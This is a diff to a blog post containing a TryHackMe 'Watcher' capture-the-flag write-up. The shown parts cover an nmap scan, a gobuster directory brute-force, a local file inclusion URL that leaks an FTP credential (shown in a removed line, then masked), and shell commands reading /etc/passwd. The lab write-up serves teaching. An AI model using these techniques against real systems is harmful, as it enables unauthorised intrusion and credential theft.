@@ -1,7 +1,7 @@
 ---
 title: "Tryhackme: Watcher"
 date: 2023-05-01T17:27:49+05:30
-description: "watcher solution"
+description: "THM watcher box solution"
 draft: false
 hideToc: false
 enableToc: true
@@ -10,7 +10,8 @@ tocFolding: false
 tocPosition: inner
 tocLevels: ["h2", "h3", "h4"]
 tags:
-- 
+- python
+- shell
 series:
 - tryhackme
 categories:
@@ -19,7 +20,9 @@ categories:
 image:
 ---
 
-Nmap scan:
+Start the room by going to [TryHackMe: Watcher](https://tryhackme.com/room/watcher)
+
+### Nmap scan:
 ```
 # Nmap 7.80 scan initiated Wed Apr 26 23:09:33 2023 as: nmap -sV -sC -oA nmap/nmap 10.10.54.168
 Nmap scan report for 10.10.54.168
@@ -41,12 +44,15 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Apr 26 23:09:58 2023 -- 1 IP address (1 host up) scanned in 24.59 seconds
 ```
+
+### GOBuster
 Do gobuster for files and check robots.txt for the files.
 ```
 gobuster dir -u http://10.10.54.168 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
 ```
 
-Local file inclusion to get the ftp user `ftpuser:givemefiles777`:
+### FTP
+Local file inclusion to get the ftp user `ftpuser:******`:
 ```
 http://10.10.54.168/post.php?post=secret_file_do_not_read.txt
 ```
@@ -83,6 +89,8 @@ Test for crontabs
 www-data@watcher:/$ crontab -l
 no crontab for www-data
 ```
+
+### cat /etc/passwd
 
 ```
 www-data@watcher:/home/mat/scripts$ cat /etc/passwd
